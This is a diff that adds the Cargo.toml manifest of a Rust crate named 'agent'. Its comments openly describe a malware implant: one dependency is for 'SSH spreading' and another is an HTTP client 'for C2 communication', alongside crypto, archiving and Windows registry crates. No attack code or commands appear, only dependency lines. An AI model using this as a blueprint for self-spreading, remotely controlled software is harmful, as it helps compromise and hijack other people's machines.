@@ -1,0 +1,43 @@
+[package]
+name = "agent"
+version = "0.1.0"
+authors = ["Saladino Belisario <SaladinoBelisario@protonmail.ch>"]
+edition = "2021"
+
+[dependencies]
+# OS / platform helpers
+dirs = "3.0"
+single-instance = "0.3"
+zip = "0.5"
+
+# SSH spreading
+ssh2 = { version = "0.9", features = ["vendored-openssl", "openssl-on-win32"] }
+
+# HTTP client for C2 communication
+ureq = { version = "2", features = ["native-tls", "json"] }
+native-tls = "0.2"
+
+# Serialization
+serde = { version = "1", features = ["derive"] }
+serde_json = "1"
+
+# Crypto
+rand = "0.8"
+ed25519-dalek = "1"
+x25519-dalek = "1"
+chacha20poly1305 = "0.9"
+blake2 = "0.9"
+zeroize = "1"
+
+# Utilities
+uuid = { version = "1", features = ["v4"] }
+base64 = "0.13"
+log = "0.4"
+env_logger = "0.10"
+dotenv = "0.15"
+
+# Shared types
+common = { path = "../common" }
+
+[target.'cfg(target_os = "windows")'.dependencies]
+winreg = "0.10"
